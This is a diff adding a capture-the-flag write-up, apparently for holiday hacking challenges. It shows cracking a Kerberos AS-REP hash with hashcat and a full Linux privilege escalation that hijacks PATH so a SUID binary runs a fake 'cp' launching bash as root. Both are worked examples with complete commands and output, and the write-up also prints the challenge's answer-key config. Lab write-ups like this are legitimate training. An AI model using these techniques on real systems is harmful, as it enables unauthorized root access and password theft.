@@ -515,20 +515,540 @@ Once all pixels are in their correct location (Be careful with the last one! You
 
 ![](/docs/assets/images/gcv1.png)
 
-
-
 This QR code is linked to 
 
 ```javascript
 8bitelf.com
 ```
 
-Visiting the website reveals the flag to plug into your badge. To achieve glory enter
+Visiting the website reveals the flag to plug into your badge. To achieve glory enter the below into your bade
 
 ```javascript
 santaconfusedgivingplanetsqrcode
 ```
 
-into your badge
+---
+
+Objective: Hashcat
+
+Instructions:
+
+```
+In a realm of bytes and digital cheer,  
+The festive season brings a challenge near.  
+Santa's code has twists that may enthrall,  
+It's up to you to decode them all.
+
+Hidden deep in the snow is a kerberos token,  
+Its type and form, in whispers, spoken.  
+From reindeers' leaps to the elfish toast,  
+Might the secret be in an ASREP roast?
+
+`hashcat`, your reindeer, so spry and true,  
+Will leap through hashes, bringing answers to you.  
+But heed this advice to temper your pace,  
+`-w 1 -u 1 --kernel-accel 1 --kernel-loops 1`, just in case.
+
+For within this quest, speed isn't the key,  
+Patience and thought will set the answers free.  
+So include these flags, let your command be slow,  
+And watch as the right solutions begin to show.
+
+For hints on the hash, when you feel quite adrift,  
+This festive link, your spirits, will lift:  
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+And when in doubt of `hashcat`'s might,  
+The CLI docs will guide you right:  
+https://hashcat.net/wiki/doku.php?id=hashcat
+
+Once you've cracked it, with joy and glee so raw,  
+Run /bin/runtoanswer, without a flaw.  
+Submit the password for Alabaster Snowball,  
+Only then can you claim the prize, the best of all.
+
+So light up your terminal, with commands so grand,  
+Crack the code, with `hashcat` in hand!  
+Merry Cracking to each, by the pixelated moon's light,  
+May your hashes be merry, and your codes so right!
+
+* Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to /bin/runtoanswer .*
+```
+
+Hash.txt contents:
+
+```bash
+$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966
+```
+
+Grep through the hashcat manual to find the proper hashmode for the hash at hand
+
+```bash
+elf@d2bdc40ea53d:~$ hashcat --help | grep -i "kerberos"
+   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
+  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
+  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
+```
+
+We can use our handy poem to determine we need mode to handle *ASREP* or we can leverage the output of the hash.txt file to see we need a mode that can handle Kerberos 5 ASREP, aka 18200.
+
+Hashcat command:
+
+```bash
+hashcat -m 18200 hash.txt password_list.txt -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 -o password.txt --force
+```
+
+Hashcat output:
+
+```bash
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: The pocl project
+====================================
+* Device #1: pthread-Intel(R) Xeon(R) CPU @ 2.80GHz, 8192/30063 MB allocatable, 8MCU
+
+Hashes: 1 digests; 1 unique digests, 1 uniue salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+ATTENTION! Pure (unoptimized) OpenCL kernels selected.
+This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=16 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll'
+* Device #1: Kernel m18200_a0-pure.d7bc3268.kernel not found in cache! Building may take a while...
+Dictionary cache built:
+* Filename..: password_list.txt
+* Passwords.: 144
+* Bytes.....: 2776
+* Keyspace..: 144
+* Runtime...: 0 secs
+
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.  
+
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos 5 AS-REP etype 23
+Hash.Target......: $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2...dd1966
+Time.Started.....: Sat Dec  9 00:59:53 2023 (0 secs)
+Time.Estimated...: Sat Dec  9 00:59:53 2023 (0 secs)
+Guess.Base.......: File (password_list.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      817 H/s (0.75ms) @ Accel:1 Loops:1 Thr:64 Vec:16
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 144/144 (100.00%)
+Rejected.........: 0/144 (0.00%)
+Restore.Point....: 0/144 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-0
+Candidates.#1....: 1LuvCandyC4n3s!2022 -> iLuvC4ndyC4n3s!23!
+
+Started: Sat Dec  9 00:59:34 2023
+Stopped: Sat Dec  9 00:59:54 2023
+```
+
+Checking the contents of password.txt where we had hashcat set to output our cracked password...
+
+```bash
+elf@f1f72d836708:~$ cat password.txt 
+$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!
+```
+
+Running /bin/runtoanswer and inputting our cracked password
+
+```bash
+elf@f1f72d836708:~$ /bin/runtoanswer 
+What is the password for the hash in /home/elf/hash.txt ?
+
+> IluvC4ndyC4nes!
+Your answer: IluvC4ndyC4nes!
+
+Checking....
+Your answer is correct!
+```
+
+---
+
+Objective: Linux PrivEsc
+
+Instructions:
+
+```bash
+In a digital winter wonderland we play,
+Where elves and bytes in harmony lay.
+This festive terminal is clear and bright,
+Escalate privileges, and bring forth the light.
+
+Start in the land of bash, where you reside,
+But to win this game, to root you must glide.
+Climb the ladder, permissions to seize,
+Unravel the mystery, with elegance and ease.
+
+There lies a gift, in the root's domain,
+An executable file to run, the prize you'll obtain.
+The game is won, the challenge complete,
+Merry Christmas to all, and to all, a root feat!
+
+* Find a method to escalate privileges inside this terminal and then run the binary in /root *
+```
+
+
+
+Find command for files with the SUID bit set
+
+```bash
+find / -perm -u=s -type f 2>/dev/null 
+```
+
+Results: 
+
+```bash
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/simplecopy
+```
+
+Why do I care about the SUID bit? 
+
+A program that has the SUID (set user ID) bit set will run in the context of the user that owns that file. This can be very dangerous if set for any binaries that can alter or overwrite files. In addition, if it is set for a binary that calls out to another binary using a non-explicit path, we can create a malicious file where it is trying to reach out to elevate our permissions. 
+
+
+
+Strings on the /bin/simplecopy to see if we can identify any files/binaries it may be calling out to
+
+```bash
+elf@6043897b7dfe:~$ strings /bin/simplecopy 
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+exit
+__stack_chk_fail
+system
+__cxa_finalize
+setgid
+__libc_start_main
+snprintf
+GLIBC_2.2.5
+GLIBC_2.4
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+Usage: %s <source> <destination>
+cp %s %s
+:*3$"
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8061
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+simplecopy.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+snprintf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+setgid@@GLIBC_2.2.5
+exit@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+elf@6043897b7dfe:~$ strings /bin/simplecopy | less
+bash: less: command not found
+elf@6043897b7dfe:~$ strings /bin/simplecopy 
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+exit
+__stack_chk_fail
+system
+__cxa_finalize
+setgid
+__libc_start_main
+snprintf
+GLIBC_2.2.5
+GLIBC_2.4
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+Usage: %s <source> <destination>
+cp %s %s
+:*3$"
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8061
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+simplecopy.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+snprintf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+setgid@@GLIBC_2.2.5
+exit@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+```
+
+Within our strings results, it looks like simplecopy is calling out to "cp" to leverage it's file copy function. As stated earlier, calling out a binary without an explicit path can be dangerous...let's see what we can do.
+
+Let's check out where the OS thinks cp lives
+
+```bash
+elf@6043897b7dfe:~$ which cp
+/usr/bin/cp
+```
+
+The OS believes that it should look in /usr/bin when it is asked to run "cp". Well, that's because of the environmental variable PATH. The OS looks at the PATH variable to determine where it should look for "cp" in our case. We can look at all PATH variables and see that /usr/bin is present.
+
+```bash
+elf@6043897b7dfe:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+Let's see if we can create a malicious executable called "cp" and change the PATH variable for the OS to find our new "cp" when running simplecopy
+
+```bash
+elf@6043897b7dfe:/tmp$ echo "/bin/bash" > cp 
+elf@6043897b7dfe:/tmp$ chmod +x cp 
+elf@6043897b7dfe:/tmp$ cat cp
+/bin/bash
+```
+
+We created a new file called "cp" in /tmp that will launch a bash session and made it executable. If we can get simplecopy to run this, it will run with the root UID and give us root permissions. 
+
+Let's alter our environmental variable PATH. We can set it so it will look through the /tmp directory before /usr/bin, so it will see our new "cp" file first!
+
+```bash
+elf@6043897b7dfe:/tmp$ which cp
+/usr/bin/cp
+elf@6043897b7dfe:/tmp$ export PATH=/tmp:$PATH
+elf@6043897b7dfe:/tmp$ which cp
+/tmp/cp
+```
+
+Now, let's execute simplecopy and copy any file. It doesn't matter what, we just need the binary to execute.
+
+```bash
+elf@6043897b7dfe:/tmp$ /bin/simplecopy /home/elf/HELP /tmp 
+root@6043897b7dfe:/tmp# 
+```
+
+And boom! We are root! 
+
+```bash
+root@6043897b7dfe:/tmp# whoami
+root
+```
+
+Now let's move into the /root directory as the original instructions told us and run the binary in there. It looks like it wants to know who delivers christmas presents.
+
+```bash
+root@6043897b7dfe:/root# cd /tmp
+root@6043897b7dfe:/tmp# cd /root
+root@6043897b7dfe:/root# ls
+runmetoanswer
+root@6043897b7dfe:/root# ./runmetoanswer 
+Who delivers Christmas presents?
+
+> 
+
+
+```
+
+Let's see if there is a file somewhere that is holding the answer key for us. We can use grep to recursively search the system for our prompt.
+
+```bash
+root@6043897b7dfe:/root# grep -inr "Who delivers christmas presents" / 2>/dev/null
+/etc/runtoanswer.yaml:12:  Who delivers Christmas presents?
+
+```
+
+Bingo! /etc/runtoanswer.yaml seems to have our question in it, let's check it out further.
+
+```bash
+root@6043897b7dfe:/root# cat /etc/runtoanswer.yaml 
+# This is the config file for runtoanswer, where you can set up your challenge!
+---
+
+# This is the completionSecret from the Content sheet - don't tell the user this!
+key: b08b538569e395f88e12ef9fe751ac39
+
+# The answer that the user is expected to enter - case sensitive
+# (This is optional - if you don't have an answer, then running this will immediately win)
+answer: "santa"
+
+text: |
+  Who delivers Christmas presents?
+
+success_message: "Your answer is *correct*!"
+failure_message: "Sorry, that answer is *incorrect*. Please try again!"
+
+# A prompt that is displayed if the user runs this interactively (they might
+# not see this - answers can be entered as an argument)
+prompt: "> "
+
+# Optional: a time, in seconds, to delay before validating the answer (to
+# prevent guessing)
+delay: 1
+
+# Optional: skip (most) stdout output if the answer is correct
+headless: false
+
+# If set to true, don't exit after the user asks
+keep_going: false
+
+# Optional: play this sound on completion or failure
+#completion_sound: 'myhappysound.mp3'
+#failure_sound: 'mysadsound.mp3'
+
+# Close the terminal when it is completed?
+exit_on_completion: false
+```
+
+It appears our answer is "santa". Let's give it a try. 
+
+```bash
+root@6043897b7dfe:/root# ./runmetoanswer 
+Who delivers Christmas presents?
+
+> santa
+Your answer: santa
+
+Checking....
+Your answer is correct!
+```
+
+GLORY!
+
+---
+
+Objective: Luggage Lock
+
+Not much skill or technique here... just apply the right amount of pressure until all wheels lock into a position, then apply full pressure to the lock and watch the zipper pop open!
+
+![](/docs/assets/images/ll1.png)
 
 ---
